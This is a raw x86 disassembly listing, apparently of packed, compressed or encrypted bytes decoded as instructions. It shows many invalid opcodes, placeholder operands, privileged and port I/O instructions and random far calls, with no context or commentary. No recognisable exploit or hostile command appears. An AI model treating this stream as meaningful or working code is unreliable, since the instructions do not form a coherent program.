  4093c4:	sbb    ah,bh
  4093c6:	pop    esi
  4093c7:	mov    ds:0xc127bcf8,eax
  4093cc:	retf   0x8b39
  4093cf:	das    
  4093d0:	dec    ecx
  4093d1:	mov    bh,0x32
  4093d3:	push   edx
  4093d4:	xor    BYTE PTR [edi-0x2119ddde],dl
  4093da:	jge    0x4093a8
  4093dc:	add    BYTE PTR [ecx],bh
  4093de:	push   ss
  4093df:	jg     0x409410
  4093e1:	mov    eax,ds:0xa7a6ea23
  4093e6:	mov    dh,0xd3
  4093e8:	sar    BYTE PTR ds:0xcf221e1c,0x4e
  4093ef:	lods   al,BYTE PTR ds:[esi]
  4093f0:	mov    dl,0xee
  4093f2:	xor    bl,BYTE PTR [eax-0x31]
  4093f5:	pop    ebx
  4093f6:	neg    DWORD PTR [edx-0x56b68cec]
  4093fc:	data16 or cl,0x3f
  409400:	push   0xb6ef5087
  409405:	cmp    BYTE PTR [ebx+0x5c],ah
  409408:	push   esp
  409409:	xchg   ebx,eax
  40940a:	enter  0x9224,0xdd
  40940e:	xchg   DWORD PTR ds:[edx-0x10],edi
  409412:	xchg   esi,eax
  409413:	repz mov bl,0xe6
  409416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409417:	add    al,0x66
  409419:	cmp    eax,0xdba02dba
  40941e:	cmp    ebx,esi
  409420:	xor    ah,BYTE PTR [ecx-0x4e]
  409423:	mov    edi,0xa6912508
  409428:	mov    al,ds:0x49b100bd
  40942d:	stc    
  40942e:	xchg   esi,eax
  40942f:	les    ebp,FWORD PTR [ecx+0x30]
  409432:	pop    edi
  409433:	add    dl,BYTE PTR [eax-0x44b2cc2a]
  409439:	jne    0x4093f8
  40943b:	push   edi
  40943c:	sub    eax,0xdf01544
  409441:	mov    BYTE PTR [edx+0x5e069cf2],dh
  409447:	mov    al,ds:0x825486ee
  40944c:	or     DWORD PTR [ecx-0x32],0xa2c9192f
  409453:	ror    BYTE PTR [ebp-0x2c904293],cl
  409459:	and    al,0x3f
  40945b:	or     BYTE PTR [edi+0x29fa5c19],0x62
  409462:	mov    ecx,0x97802468
  409467:	popa   
  409468:	sar    DWORD PTR [esi+0x10],1
  40946b:	sub    al,0xc9
  40946d:	mul    DWORD PTR [edx+0x55]
  409470:	pop    ebp
  409471:	inc    al
  409473:	mov    dh,BYTE PTR [ecx-0x15]
  409476:	jo     0x4094f3
  409478:	sbb    BYTE PTR [ebp-0x33],dh
  40947b:	adc    DWORD PTR [esi-0x45],ecx
  40947e:	shr    BYTE PTR [ebp-0x2a],cl
  409481:	int3   
  409482:	ret    0xbee6
  409485:	cmp    DWORD PTR [esi-0xd],esi
  409488:	and    al,0xda
  40948a:	adc    al,0x47
  40948c:	pop    ecx
  40948d:	mov    eax,ds:0xcb8bb75
  409492:	push   ss
  409493:	inc    edi
  409494:	dec    esp
  409495:	jo     0x409447
  409497:	push   edi
  409498:	cmp    bh,BYTE PTR [edx]
  40949a:	jno    0x4094aa
  40949c:	sbb    DWORD PTR [ebx+esi*4],ecx
  40949f:	mov    esi,DWORD PTR [esi+0x74988fc7]
  4094a5:	and    al,bh
  4094a7:	dec    esp
  4094a8:	dec    edi
  4094a9:	add    eax,0x10b8c0b3
  4094ae:	mov    bh,0x68
  4094b0:	xor    al,0x71
  4094b2:	lods   al,BYTE PTR ds:[esi]
  4094b3:	sub    al,0xb1
  4094b5:	adc    al,0x26
  4094b7:	mov    esp,0x79b2300f
  4094bc:	sbb    al,0xdc
  4094be:	sbb    DWORD PTR [eax+0x44feb772],edx
  4094c4:	xor    BYTE PTR [edx+0x7d],dl
  4094c7:	test   ebp,eax
  4094c9:	pop    edx
  4094ca:	dec    ecx
  4094cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094cc:	ret    0x6911
  4094cf:	popa   
  4094d0:	add    al,BYTE PTR [esi+0x2c]
  4094d3:	sbb    edx,0x43
  4094d6:	fdivr  st,st(5)
  4094d8:	add    eax,0xd12e4db3
  4094dd:	xor    al,0x67
  4094df:	sbb    edi,DWORD PTR [ecx-0x27]
  4094e2:	cmc    
  4094e3:	fsubr  DWORD PTR [eax-0x271a4128]
  4094e9:	out    0xe9,al
  4094eb:	jge    0x4094de
  4094ed:	cmp    DWORD PTR [esi-0x34],edx
  4094f0:	mov    dh,0xa1
  4094f2:	and    DWORD PTR [ecx],edx
  4094f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094f5:	mov    bl,0xaf
  4094f7:	aas    
  4094f8:	sbb    DWORD PTR [edi-0x749548a0],ebp
  4094fe:	pop    esi
  4094ff:	add    eax,0xbf706dba
  409504:	pop    edi
  409505:	int    0x48
  409507:	ds cmp al,0x77
  40950a:	inc    ecx
  40950b:	out    0x29,eax
  40950d:	mov    dh,BYTE PTR [ecx-0x4b]
  409510:	loope  0x409494
  409512:	mov    eax,ds:0x10ab31ac
  409517:	xchg   ecx,eax
  409518:	hlt    
  409519:	(bad)  
  40951a:	wrmsr  
  40951c:	or     al,0x5f
  40951e:	retf   
  40951f:	and    al,0xfc
  409521:	into   
  409522:	fcom   st(6)
  409524:	jmp    0x4094ca
  409526:	imul   ecx,DWORD PTR [edi],0xffffffa1
  409529:	jno    0x409559
  40952b:	or     DWORD PTR [ecx+0x6d3fc657],edx
  409531:	xchg   dl,cl
  409533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409534:	leave  
  409535:	enter  0x5e17,0x2a
  409539:	loope  0x40955a
  40953b:	retf   
  40953c:	(bad)  
  40953d:	outs   dx,DWORD PTR ds:[esi]
  40953e:	and    esp,DWORD PTR [esi+0x47]
  409541:	and    bl,BYTE PTR [esi]
  409543:	or     eax,0x15c974f1
  409548:	pop    esi
  409549:	mov    eax,ds:0xf0a3f0be
  40954e:	gs mov dh,dh
  409551:	loopne 0x409502
  409553:	int3   
  409554:	xchg   ecx,eax
  409555:	int3   
  409556:	je     0x409573
  409558:	lods   al,BYTE PTR ds:[esi]
  409559:	add    eax,0xc82e9a44
  40955e:	xor    DWORD PTR [edx-0x48ea73ba],esp
  409564:	jp     0x4095c9
  409566:	push   ebp
  409567:	test   DWORD PTR [ebp-0x53],0x47cd33a5
  40956e:	adc    ah,BYTE PTR [ebp+0x4]
  409571:	cs mov bh,0x7
  409574:	fwait
  409575:	scas   eax,DWORD PTR es:[edi]
  409576:	dec    esi
  409577:	aam    0x72
  409579:	(bad)  
  40957a:	cmp    ebx,esi
  40957c:	enter  0x3b2f,0xcf
  409580:	add    BYTE PTR [eax+ecx*2-0x3031935a],ch
  409587:	(bad)  
  409588:	push   cs
  409589:	pcmpgtd mm2,QWORD PTR [eax+0xa558c88]
  409590:	xchg   DWORD PTR [ecx-0x1e],esp
  409593:	add    al,0x51
  409595:	adc    al,0x45
  409597:	outs   dx,BYTE PTR ds:[esi]
  409598:	cmp    DWORD PTR [edx],ebx
  40959a:	sub    al,0x60
  40959c:	in     al,0x53
  40959e:	(bad)  
  40959f:	cld    
  4095a0:	lods   al,BYTE PTR ds:[esi]
  4095a1:	sub    BYTE PTR [edx-0x129ef5e5],ch
  4095a7:	loope  0x409583
  4095a9:	aad    0x54
  4095ab:	cmp    eax,0xc0aa250e
  4095b0:	arpl   ax,di
  4095b2:	test   al,0x81
  4095b4:	outs   dx,BYTE PTR ds:[esi]
  4095b5:	sbb    edx,DWORD PTR [esp+ecx*1]
  4095b8:	push   cs
  4095b9:	sub    esp,0xfffffffc
  4095bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095bd:	test   DWORD PTR [ebx],0x12c05449
  4095c3:	dec    edx
  4095c4:	retf   
  4095c5:	adc    bl,cl
  4095c7:	pop    ds
  4095c8:	xchg   ebx,eax
  4095c9:	in     al,0x79
  4095cb:	out    dx,eax
  4095cc:	cmp    al,0x48
  4095ce:	(bad)  
  4095cf:	repnz fdiv QWORD PTR [eax+0x6c8828e]
  4095d6:	sbb    BYTE PTR [ebx],0xf6
  4095d9:	inc    ecx
  4095da:	mov    ebx,DWORD PTR [esi-0x3f61f493]
  4095e0:	mov    cl,0xf2
  4095e2:	pusha  
  4095e3:	or     DWORD PTR [ebx+edx*2-0x101f08e0],edi
  4095ea:	neg    BYTE PTR [ebp+0x78]
  4095ed:	add    eax,0xf525a500
  4095f2:	lds    ebp,FWORD PTR [ecx+0x61]
  4095f5:	iret   
  4095f6:	out    dx,al
  4095f7:	test   al,0x3f
  4095f9:	inc    ecx
  4095fa:	jl     0x409649
  4095fc:	jb     0x4095a3
  4095fe:	lea    esp,[esi]
  409600:	pop    es
  409601:	mov    edx,0xdf3a737f
  409606:	push   es
  409607:	lods   al,BYTE PTR ds:[esi]
  409608:	xchg   edx,eax
  409609:	adc    eax,0x85dc600e
  40960e:	sub    ah,BYTE PTR [edi+0x49]
  409611:	aad    0x88
  409613:	bound  edi,QWORD PTR [esi-0x253b3b53]
  409619:	cmp    al,0x48
  40961b:	lea    eax,[esi-0x2e]
  40961e:	repz cmp ecx,ecx
  409621:	inc    esi
  409622:	mov    esi,0x6ee960c7
  409627:	mov    ah,0x8
  409629:	scas   al,BYTE PTR es:[edi]
  40962a:	ins    BYTE PTR es:[edi],dx
  40962b:	retf   0x376a
  40962e:	cmp    edx,edi
  409630:	pop    eax
  409631:	mov    esp,0x9a4446c9
  409636:	das    
  409637:	sub    BYTE PTR [ebp+0x34],0xf7
  40963b:	out    dx,al
  40963c:	xchg   edx,eax
  40963d:	adc    BYTE PTR [ebx+0x530c62e4],bl
  409643:	fistp  DWORD PTR [esi+0x3e]
  409646:	cmp    eax,0xb8727635
  40964b:	retf   0x7ddd
  40964e:	ins    BYTE PTR es:[edi],dx
  40964f:	sub    BYTE PTR [ecx-0x18cfa29f],dl
  409655:	and    esp,eax
  409657:	xor    esp,DWORD PTR [edx-0x14]
  40965a:	adc    eax,0x3457c513
  40965f:	shr    BYTE PTR [ecx],0xd1
  409662:	xchg   ebp,eax
  409663:	(bad)  
  409664:	sti    
  409665:	dec    ecx
  409666:	dec    ecx
  409667:	adc    eax,0x9e2627c
  40966c:	cs dec esi
  40966e:	retf   
  40966f:	xlat   BYTE PTR ds:[ebx]
  409670:	mov    WORD PTR [ecx-0x63],fs
  409673:	pushf  
  409674:	mov    esp,DWORD PTR cs:[ecx]
  409677:	sahf   
  409678:	inc    ebp
  409679:	je     0x409694
  40967b:	in     eax,dx
  40967c:	mov    ds:0x961fa23d,al
  409681:	rcl    DWORD PTR fs:[eax],0x72
  409685:	dec    ecx
  409686:	and    edi,DWORD PTR [ecx+ebx*2]
  409689:	out    0xf9,eax
  40968b:	sbb    ecx,ecx
  40968d:	hlt    
  40968e:	retf   
  40968f:	test   DWORD PTR [edi+ebx*4+0x26],edi
  409693:	retf   
  409694:	in     al,dx
  409695:	pop    edx
  409696:	mov    ah,0x94
  409698:	push   eax
  409699:	sub    al,0x14
  40969b:	push   ecx
  40969c:	adc    al,0x6b
  40969e:	ds shr edi,1
  4096a1:	sub    BYTE PTR [ebx-0x6],dl
  4096a4:	pop    ss
  4096a5:	xor    al,0x1a
  4096a7:	int    0x47
  4096a9:	sub    DWORD PTR [edi-0x46a09f6b],ebx
  4096af:	cmp    ch,BYTE PTR [esi-0x1f]
  4096b2:	mov    ds,WORD PTR [edx]
  4096b4:	sub    al,BYTE PTR [edx+0x1b]
  4096b7:	in     eax,dx
  4096b8:	rcr    DWORD PTR [esi+esi*8],1
  4096bb:	xchg   ecx,eax
  4096bc:	(bad)  
  4096bd:	mov    cl,0x81
  4096bf:	or     eax,edx
  4096c1:	xlat   BYTE PTR ds:[ebx]
  4096c2:	and    ah,BYTE PTR [ebp-0x5]
  4096c5:	scas   al,BYTE PTR es:[edi]
  4096c6:	mul    DWORD PTR [eax-0xdd1db68]
  4096cc:	gs int 0xff
  4096cf:	outs   dx,DWORD PTR ds:[esi]
  4096d0:	jl     0x409729
  4096d2:	stc    
  4096d3:	push   edx
  4096d4:	dec    edx
  4096d5:	sbb    ebp,DWORD PTR [edx+0x56adbcea]
  4096db:	aam    0x62
  4096dd:	dec    esp
  4096de:	add    dh,BYTE PTR [ebx+0xa]
  4096e1:	je     0x409727
  4096e3:	cdq    
  4096e4:	shr    esp,cl
  4096e6:	xchg   ebp,eax
  4096e7:	out    0x2,eax
  4096e9:	(bad)  
  4096ea:	xchg   edx,eax
  4096eb:	pusha  
  4096ec:	in     eax,dx
  4096ed:	in     al,dx
  4096ee:	stos   BYTE PTR es:[edi],al
  4096ef:	adc    BYTE PTR [ebx+0x64],ch
  4096f2:	mov    al,0x86
  4096f4:	inc    ebp
  4096f5:	mov    ecx,0x80a04f00
  4096fa:	pop    ss
  4096fb:	cmp    dh,BYTE PTR [eax+0xd3f4cef]
  409701:	or     esp,DWORD PTR [edx+0x1]
  409704:	inc    ecx
  409705:	mov    edx,0x516f01d
  40970a:	add    ebp,DWORD PTR [ebx]
  40970c:	push   edi
  40970d:	and    BYTE PTR [edi-0x7],bl
  409710:	sub    eax,0x540b8e3b
  409715:	iret   
  409716:	cmp    dh,bl
  409718:	ret    
  409719:	cmp    BYTE PTR [edx+0x7cde5941],cl
  40971f:	inc    ecx
  409720:	xchg   DWORD PTR [ecx-0x53362a6b],edx
  409726:	mov    BYTE PTR [ebx+0x11520527],0xcf
  40972d:	or     edx,DWORD PTR [eax-0x535fcca2]
  409733:	xor    bl,BYTE PTR [eax-0x12]
  409736:	mov    ds:0xc5308f81,al
  40973b:	daa    
  40973c:	push   0xffffffa2
  40973e:	xor    DWORD PTR [esi+0x4f],0xf
  409742:	jae    0x40976e
  409744:	jmp    0x7aadf013
  409749:	aaa    
  40974a:	retf   
  40974b:	je     0x40976a
  40974d:	lds    esp,FWORD PTR [edx+ebp*4]
  409750:	mov    esp,0xbf5bfd7
  409755:	add    cl,BYTE PTR [esi+esi*1-0x2a]
  409759:	ret    0x86b6
  40975c:	into   
  40975d:	dec    ebx
  40975e:	xlat   BYTE PTR ds:[ebx]
  40975f:	and    al,0xe4
  409761:	pop    es
  409762:	clc    
  409763:	push   ds
  409764:	add    eax,0xb0df3ca6
  409769:	arpl   WORD PTR ds:0x75a3bdcf,ax
  40976f:	retf   0xe443
  409772:	aam    0xed
  409774:	sub    BYTE PTR [ecx],ah
  409776:	dec    edi
  409777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409778:	adc    eax,0xc17f3fc9
  40977d:	cmp    BYTE PTR [eax],dh
  40977f:	popa   
  409780:	fwait
  409781:	call   0xa94a:0xa2f0b307
  409788:	shr    al,cl
  40978a:	xor    eax,0xd369dfd9
  40978f:	jns    0x40975c
  409791:	xor    DWORD PTR [edx],esi
  409793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409794:	(bad)  
  409795:	out    0x3e,eax
  409797:	popa   
  409798:	jg     0x409775
  40979a:	repz inc ebp
  40979c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40979d:	add    ebx,DWORD PTR [ebx+ebx*2+0x347e5614]
  4097a4:	sbb    DWORD PTR [eax+ebp*1],esi
  4097a7:	inc    ecx
  4097a8:	shr    DWORD PTR [ebp+0x3ef0c9a5],1
  4097ae:	xor    dh,BYTE PTR [edi-0x10664753]
  4097b4:	add    BYTE PTR [esi-0x4b8ec0a7],bl
  4097ba:	dec    ebx
  4097bb:	fldcw  WORD PTR [ebp+0x56cb55c6]
  4097c1:	push   es
  4097c2:	push   0x2d0ccb94
  4097c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c8:	sbb    ch,BYTE PTR cs:[esi]
  4097cb:	jns    0x4097a6
  4097cd:	out    0x42,eax
  4097cf:	rcl    DWORD PTR [ecx-0x6d],0xd8
  4097d3:	mov    ss,ebx
  4097d5:	pusha  
  4097d6:	ds call 0xa8f12ecb
  4097dc:	pop    edi
  4097dd:	xor    al,0x1d
  4097df:	js     0x4097db
  4097e1:	jge    0x40977a
  4097e3:	jns    0x409858
  4097e5:	lahf   
  4097e6:	mov    eax,ds:0x912fb0d8
  4097eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097ec:	dec    esp
  4097ed:	inc    ebx
  4097ee:	sbb    eax,0x65667676
  4097f3:	sub    dh,BYTE PTR [esp+ebx*8-0x47]
  4097f7:	psllw  mm0,0xa7
  4097fb:	add    dl,cl
  4097fd:	popf   
  4097fe:	push   ebp
  4097ff:	out    dx,al
  409800:	and    al,0xb9
  409802:	retf   
  409803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409804:	stos   BYTE PTR es:[edi],al
  409805:	aas    
  409806:	ret    0xbc99
  409809:	jecxz  0x4097ed
  40980b:	mov    al,gs:0x349dc422
  409811:	stos   DWORD PTR es:[edi],eax
  409812:	ret    
  409813:	jno    0x4097f4
  409815:	das    
  409816:	mov    DWORD PTR [eax-0x16],edi
  409819:	inc    eax
  40981a:	and    eax,0x55034eb1
  40981f:	xchg   ebp,eax
  409820:	inc    edi
  409821:	iret   
  409822:	aaa    
  409823:	jp     0x4097a6
  409825:	ins    BYTE PTR es:[edi],dx
  409826:	fild   QWORD PTR [ecx+0x33df41f5]
  40982c:	std    
  40982d:	jno    0x409859
  40982f:	ffreep st(7)
  409831:	imul   edx,DWORD PTR [ebp+0x283af04a],0x18b15a29
  40983b:	test   eax,0x6bebbc8a
  409840:	js     0x409898
  409842:	mov    bl,cl
  409844:	call   0x6504:0xb7ae8bb4
  40984b:	rol    DWORD PTR [ebp+0x61],0xb
  40984f:	mov    ecx,0xb503d998
  409854:	les    edx,FWORD PTR [ebx+0x31]
  409857:	cmc    
  409858:	jno    0x409847
  40985a:	add    BYTE PTR [eax],0x21
  40985d:	sti    
  40985e:	mov    eax,ds:0xe2246cd7
  409863:	inc    ebp
  409864:	xor    al,0x3d
  409866:	mov    ecx,0x28a98253
  40986b:	out    dx,eax
  40986c:	adc    DWORD PTR [esi],ecx
  40986e:	jbe    0x409852
  409870:	mov    cl,0xfb
  409872:	add    al,0x82
  409874:	cwde   
  409875:	mov    WORD PTR [ecx],?
  409877:	mov    ah,0x23
  409879:	and    al,0x9c
  40987b:	cdq    
  40987c:	pop    edx
  40987d:	or     DWORD PTR [eax-0x1e],0xf80b68a8
  409884:	sbb    eax,DWORD PTR [ebx+edx*2]
  409887:	call   0xe9f4:0xcaa3da60
  40988e:	push   eax
  40988f:	cmp    al,0x5e
  409891:	mov    eax,ds:0xd642f8d4
  409896:	or     eax,DWORD PTR [esi-0x812b251]
  40989c:	jb     0x409846
  40989e:	mov    esi,0xaf3e9aef
  4098a3:	test   BYTE PTR [edi],ah
  4098a5:	dec    edi
  4098a6:	jecxz  0x409908
  4098a8:	push   cs
  4098a9:	adc    al,0xd9
  4098ab:	in     eax,dx
  4098ac:	pop    esp
  4098ad:	xchg   BYTE PTR [esi-0x69],dl
  4098b0:	adc    al,0xc8
  4098b2:	adc    BYTE PTR [ecx+0x35],bl
  4098b5:	cmp    eax,0xfac320e0
  4098ba:	xchg   edi,eax
  4098bb:	addr16 test al,0x0
  4098be:	sahf   
  4098bf:	mov    esi,0x3d9c2d47
  4098c4:	aad    0x8
  4098c6:	test   al,0x25
  4098c8:	sbb    BYTE PTR [edx+0x34],dl
  4098cb:	jbe    0x40984f
  4098cd:	xor    eax,0x755499bb
  4098d2:	gs out 0xb0,eax
  4098d5:	fcomp  QWORD PTR [eax+ebp*1+0x3a]
  4098d9:	xchg   DWORD PTR [eax+0x39],esi
  4098dc:	pop    es
  4098dd:	fdivr  DWORD PTR [eax-0x4b]
  4098e0:	mov    dh,0xd3
  4098e2:	bswap  ecx
  4098e4:	jmp    0x40987c
  4098e6:	shl    DWORD PTR [esi-0x75de528a],cl
  4098ec:	popf   
  4098ed:	cld    
  4098ee:	adc    DWORD PTR [ecx+0x3e6ec422],0x24
  4098f5:	call   0x2e61:0x2b787b32
  4098fc:	ins    BYTE PTR es:[edi],dx
  4098fd:	or     al,0x38
  4098ff:	and    eax,0xe66a86f1
  409904:	(bad)  
  409905:	pop    esi
  409906:	mov    ch,BYTE PTR [eax+0x55efd013]
  40990c:	repz push ebx
  40990e:	xor    bl,BYTE PTR [eax+0x74]
  409911:	cmp    ecx,ecx
  409913:	xchg   ecx,eax
  409914:	mov    cl,0xe1
  409916:	stos   DWORD PTR es:[edi],eax
  409917:	jnp    0x409948
  409919:	jb     0x40991b
  40991b:	outs   dx,BYTE PTR ds:[esi]
  40991c:	pusha  
  40991d:	loopne 0x4098d6
  40991f:	bound  esp,QWORD PTR [ebx+0x1a]
  409922:	and    eax,0xb855f9a1
  409927:	jle    0x409965
  409929:	js     0x409968
  40992b:	stos   DWORD PTR es:[edi],eax
  40992c:	push   ss
  40992d:	ret    0xf4b
  409930:	add    al,0xe1
  409932:	xchg   esp,eax
  409933:	xchg   BYTE PTR [ebp+edx*4+0x27],bl
  409937:	in     eax,dx
  409938:	jne    0x4099b8
  40993a:	sbb    bl,dl
  40993c:	cmp    DWORD PTR [ebx-0x60],ecx
  40993f:	cdq    
  409940:	inc    ebp
  409941:	mov    ch,0xdc
  409944:	xchg   ecx,eax
  409945:	adc    BYTE PTR [esp+ebx*2+0x514e5339],dh
  40994c:	ss push cs
  40994e:	mov    bh,0xa3
  409950:	xchg   ebp,eax
  409951:	push   esp
  409952:	lea    ebp,[ecx]
  409954:	sub    DWORD PTR [edi],0x41
  409957:	mov    al,0x32
  409959:	mov    WORD PTR [eax],fs
  40995b:	mov    ah,0xf7
  40995d:	jg     0x4099bb
  40995f:	jecxz  0x409986
  409961:	test   eax,0x929d6798
  409966:	inc    ebp
  409967:	fild   DWORD PTR [edx]
  409969:	push   ebx
  40996a:	add    DWORD PTR [ebx-0x6c092752],0x173224ce
  409974:	jp     0x4099a5
  409976:	pop    ss
  409977:	lods   al,BYTE PTR ds:[esi]
  409978:	fmul   QWORD PTR [edx+ecx*8]
  40997b:	push   ecx
  40997c:	aad    0xf3
  40997e:	enter  0x24cd,0x42
  409982:	mov    eax,0xb99f9485
  409987:	inc    edi
  409988:	push   0x4321388e
  40998d:	adc    eax,0x4b7a9601
  409992:	and    esp,DWORD PTR [ecx-0xda56879]
  409998:	cmp    eax,esp
  40999a:	test   DWORD PTR [edi-0x5a34fa82],edi
  4099a0:	in     eax,0x9
  4099a2:	les    edx,FWORD PTR [esi]
  4099a4:	mov    esp,0xe7b57fb2
  4099a9:	xor    eax,0x420f4251
  4099ae:	jg     0x409987
  4099b0:	adc    BYTE PTR ds:0x7faf6189,dh
  4099b6:	push   0xc48fc915
  4099bb:	fwait
  4099bc:	stos   DWORD PTR es:[edi],eax
  4099bd:	pop    edx
  4099be:	dec    ecx
  4099bf:	jp     0x409987
  4099c1:	inc    ebp
  4099c2:	popf   
  4099c3:	aaa    
  4099c4:	mov    ah,0x1f
  4099c6:	jnp    0x4099ee
  4099c8:	push   ecx
  4099c9:	pop    esp
  4099ca:	mov    esi,0xa32b57a2
  4099cf:	jae    0x409982
  4099d1:	stos   BYTE PTR es:[edi],al
  4099d2:	adc    edx,edx
  4099d4:	bound  edi,QWORD PTR [ebx]
  4099d6:	pmulhuw mm2,QWORD PTR [edx]
  4099d9:	and    DWORD PTR [esi-0x1],eax
  4099dc:	lgs    ebp,FWORD PTR [edx-0x70]
  4099e0:	sub    DWORD PTR [esi-0x7f9dd8c5],ecx
  4099e6:	pop    ecx
  4099e7:	mov    BYTE PTR [esi],cl
  4099e9:	shr    ecx,1
  4099eb:	ror    BYTE PTR [ebx-0xcfb9f38],0x12
  4099f2:	out    dx,al
  4099f3:	xchg   ecx,eax
  4099f4:	les    edi,FWORD PTR [edi]
  4099f6:	aaa    
  4099f7:	sub    esp,eax
  4099f9:	test   al,0xd4
  4099fb:	loope  0x409a67
  4099fd:	stos   BYTE PTR es:[edi],al
  4099fe:	mov    ch,0x37
  409a00:	pop    DWORD PTR [edi-0x61]
  409a03:	add    ebp,esi
  409a05:	test   eax,0x72823894
  409a0a:	arpl   WORD PTR [edx+0x26],sp
  409a0d:	and    al,BYTE PTR [ebx+0x39]
  409a10:	ins    DWORD PTR es:[edi],dx
  409a11:	test   DWORD PTR [ebx-0x11aec53c],esi
  409a17:	or     eax,0x1a3bab11
  409a1c:	shl    DWORD PTR [edi+0x28864f4],cl
  409a22:	xor    BYTE PTR [esi+0x58a66087],al
  409a28:	retf   0xed74
  409a2b:	imul   edi,edi,0x5eed2db3
  409a31:	xchg   ebx,eax
  409a32:	es jne 0x409a00
  409a35:	inc    BYTE PTR [eax]
  409a37:	mov    cl,0xe4
  409a39:	mov    ebp,0x499504e2
  409a3e:	jo     0x409ab9
  409a40:	sbb    bh,bh
  409a42:	inc    edx
  409a43:	inc    esi
  409a44:	(bad)  
  409a45:	js     0x409a62
  409a47:	shl    BYTE PTR [ebx],0x7b
  409a4a:	xor    eax,0xad116953
  409a4f:	hlt    
  409a50:	pop    edx
  409a51:	imul   ebx,edi,0x2a
  409a54:	in     al,0x26
  409a56:	jae    0x409ac5
  409a58:	mov    edx,0xbc1dcd97
  409a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a5e:	push   edi
  409a5f:	xchg   ebx,eax
  409a60:	repnz push edi
  409a62:	loopne 0x409a41
  409a64:	push   cs
  409a65:	jne    0x409a9c
  409a67:	adc    BYTE PTR [edx],0xe8
  409a6a:	loop   0x409a54
  409a6c:	js     0x409a49
  409a6e:	daa    
  409a6f:	cmp    esi,ebx
  409a71:	adc    DWORD PTR [edi-0x4b9b9fe4],ebx
  409a77:	test   BYTE PTR [ebp+0x35],dh
  409a7a:	cmp    al,0x64
  409a7c:	sbb    DWORD PTR [edi+0x45],esi
  409a7f:	in     al,0x82
  409a81:	(bad)  
  409a82:	jb     0x409aac
  409a84:	add    DWORD PTR [eax+0x30],0x8d168f2
  409a8b:	out    dx,eax
  409a8c:	fs jg  0x409b01
  409a8f:	sar    DWORD PTR [ecx],0x8c
  409a92:	xchg   esi,eax
  409a93:	mov    ah,0xb6
  409a95:	sub    DWORD PTR [esi+0x4c22acb7],esi
  409a9b:	add    ebx,DWORD PTR [ecx]
  409a9d:	outs   dx,DWORD PTR ds:[esi]
  409a9e:	inc    ebp
  409a9f:	cmc    
  409aa0:	call   FWORD PTR [edi]
  409aa2:	lock xor eax,0x5cb13111
  409aa8:	arpl   WORD PTR [ebx],sp
  409aaa:	dec    ecx
  409aab:	push   ebp
  409aac:	or     eax,esi
  409aae:	ds pop edx
  409ab0:	and    BYTE PTR [edi+esi*4-0x23],ch
  409ab4:	sbb    BYTE PTR [edi+0x28],bh
  409ab7:	xchg   ah,al
  409ab9:	pusha  
  409aba:	ret    0xadc8
  409abd:	cwde   
  409abe:	sbb    eax,0xc681f342
  409ac3:	inc    ebx
  409ac4:	xchg   DWORD PTR [edx+esi*8],esi
  409ac7:	jo     0x409b41
  409ac9:	mov    ecx,0xe8ef3ff4
  409ace:	cmp    BYTE PTR [edx+0x8912efe],bl
  409ad4:	shr    BYTE PTR [ecx+0x78],0x88
  409ad8:	and    al,0xc7
  409ada:	or     eax,eax
  409adc:	push   ebx
  409add:	out    0xf9,eax
  409adf:	push   cs
  409ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ae1:	dec    esi
  409ae2:	mov    ah,0x1d
  409ae4:	dec    eax
  409ae5:	add    esp,DWORD PTR [edx+0x5f]
  409ae8:	cmp    DWORD PTR [edx-0x1c],esp
  409aeb:	arpl   sp,si
  409aed:	rol    DWORD PTR [esi-0x6789a315],1
  409af3:	inc    ecx
  409af4:	jne    0x409a94
  409af6:	push   ecx
  409af7:	bound  edx,QWORD PTR [edx-0x7a]
  409afa:	out    0x48,al
  409afc:	push   cs
  409afd:	(bad)
  409b00:	cmc    
  409b01:	sub    al,0x48
  409b03:	or     eax,0x2e2ff3e5
  409b08:	mov    ss,WORD PTR [esp+edx*1+0x12]
  409b0c:	xchg   edi,eax
  409b0d:	rol    DWORD PTR [ecx-0x34403a33],cl
  409b13:	push   ecx
  409b14:	pop    esi
  409b15:	mov    ?,WORD PTR [ebx]
  409b17:	mov    ecx,0x84d26f70
  409b1c:	enter  0x87c1,0xee
  409b20:	out    dx,eax
  409b21:	ins    BYTE PTR es:[edi],dx
  409b22:	pop    ebp
  409b23:	mov    edx,0x60695a52
  409b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b29:	leave  
  409b2a:	daa    
  409b2b:	lds    edi,FWORD PTR [eax]
  409b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b2e:	mov    edi,0x8b799984
  409b33:	clc    
  409b34:	sbb    BYTE PTR [ebx+0x5736367c],dl
  409b3a:	mov    al,0xe0
  409b3c:	adc    bh,ch
  409b3e:	adc    eax,0xd24204e4
  409b43:	bound  esi,QWORD PTR [edx+eax*8-0x4265b0fb]
  409b4a:	or     edi,0x363351a0
  409b50:	rcr    ebp,1
  409b52:	cli    
  409b53:	hlt    
  409b54:	adc    dh,BYTE PTR [ecx]
  409b56:	in     eax,dx
  409b57:	inc    esp
  409b58:	cs je  0x409b73
  409b5b:	xlat   BYTE PTR ds:[ebx]
  409b5c:	imul   ebx,DWORD PTR [ebx+0x4a],0xd3d3c84
  409b63:	call   0xba0f:0x3ccd0969
  409b6a:	(bad)  
  409b6b:	fwait
  409b6c:	je     0x409b8f
  409b6e:	and    eax,0xc75513ca
  409b73:	and    ah,BYTE PTR [edx-0x1f1b6b62]
  409b79:	cmp    eax,0x93120e75
  409b7e:	jecxz  0x409b96
  409b80:	test   eax,0xf39a4974
  409b86:	xchg   esi,eax
  409b87:	in     al,0x3d
  409b89:	lock or eax,0xe8015447
  409b8f:	scas   eax,DWORD PTR es:[edi]
  409b90:	fwait
